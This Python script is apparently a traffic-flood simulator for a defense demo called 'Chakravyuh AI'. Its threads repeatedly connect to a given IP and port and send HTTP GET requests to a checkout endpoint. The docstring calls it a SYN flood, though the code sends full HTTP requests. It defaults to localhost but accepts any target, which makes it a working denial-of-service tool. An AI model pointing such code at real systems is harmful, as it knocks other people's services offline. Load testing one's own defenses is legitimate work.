#!/usr/bin/env python3
"""
Chakravyuh AI: High-Density Traffic / SYN Flood Simulator
Simulates a high-frequency DoS/LOIC-HTTP traffic surge against the defense target or demo e-commerce storefront.
"""

import socket
import sys
import time
import threading

stop_event = threading.Event()

def flood_worker(target_ip: str, target_port: int, worker_id: int):
    payload = (
        b"GET /api/checkout HTTP/1.1\r\n"
        b"Host: " + target_ip.encode() + b"\r\n"
        b"User-Agent: Chakravyuh-Bench/2.0 (Adversarial-Simulator)\r\n"
        b"Accept: */*\r\n"
        b"Connection: close\r\n\r\n"
    )
    
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            s.connect((target_ip, target_port))
            s.send(payload)
            s.close()
        except Exception:
            pass
        time.sleep(0.005)

def start_traffic_flood(target_ip: str = "127.0.0.1", target_port: int = 5000, threads: int = 20, duration: int = 12):
    print(f"==================================================")
    print(f"[ATTACK SIMULATION] Launching High-Density Traffic Surge on {target_ip}:{target_port}")
    print(f"Target: Port {target_port} (E-Commerce Demo Storefront / API)")
    print(f"Workers: {threads} | Duration: {duration}s")
    print(f"==================================================")
    
    stop_event.clear()
    thread_pool = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(target_ip, target_port, i))
        t.daemon = True
        t.start()
        thread_pool.append(t)
        
    try:
        for remaining in range(duration, 0, -1):
            sys.stdout.write(f"\r[⚡] Flood surge active on port {target_port}... {remaining}s remaining (Press Ctrl+C to abort) ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAborted by user.")
        
    stop_event.set()
    print(f"\n[✓] Traffic flood simulation on {target_ip}:{target_port} finished.")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else (input("Enter Target IP (default 127.0.0.1): ").strip() or "127.0.0.1")
    port_arg = sys.argv[2] if len(sys.argv) > 2 else (input("Enter Target Port (default 5000 for E-Commerce / 8000 for API): ").strip() or "5000")
    threads_arg = sys.argv[3] if len(sys.argv) > 3 else "20"
    duration_arg = sys.argv[4] if len(sys.argv) > 4 else "12"

    port = int(port_arg)
    threads = int(threads_arg)
    duration = int(duration_arg)

    start_traffic_flood(target, port, threads, duration)
